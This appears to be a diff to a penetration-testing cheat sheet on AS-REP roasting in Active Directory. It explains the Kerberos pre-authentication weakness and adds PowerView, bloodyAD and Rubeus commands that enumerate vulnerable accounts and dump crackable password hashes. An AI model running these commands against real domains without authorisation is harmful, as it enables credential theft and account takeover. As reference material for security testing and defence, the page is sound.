@@ -16,7 +16,7 @@
 - AS-REQ Roasting is possible when Kerberos pre-authentication is not configured. This allows anyone to request authentication data for a user. In return, the KDC would provide an AS-REP message. 
 - Since part of that message is encrypted using the user’s password, it is possible to perform an offline brute-force attack to try and retrieve the user's password.
 - The only information an attacker requires is the username they want to attack, which can also be found using other enumeration techniques.
--  if you have `GenericWrite/GenericAll` rights over a target user, you can maliciously modify their userAccountControl to not require preauth, use ASREPRoast, and then reset the value
+- if you have `GenericWrite/GenericAll` rights over a target user, you can maliciously modify their userAccountControl to not require preauth, use ASREPRoast, and then reset the value
 
 
 it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.
@@ -27,6 +27,7 @@ it's possible to obtain the TGT for any account that has the "Do not require Ker
 ```shell
 # windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 
 # Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
@@ -37,9 +38,9 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get sear
 # Windows 
 ## Rubeus 
 ### This will automatically find all accounts that do not require preauthentication and extract their AS-REP hashes
-.\Rubeus.exe asreproast 
+.\Rubeus.exe asreproast  /nowrap /format:hashcat
 ### Targeted account
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] /nowrap /format:hashcat
 
 
 ## From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
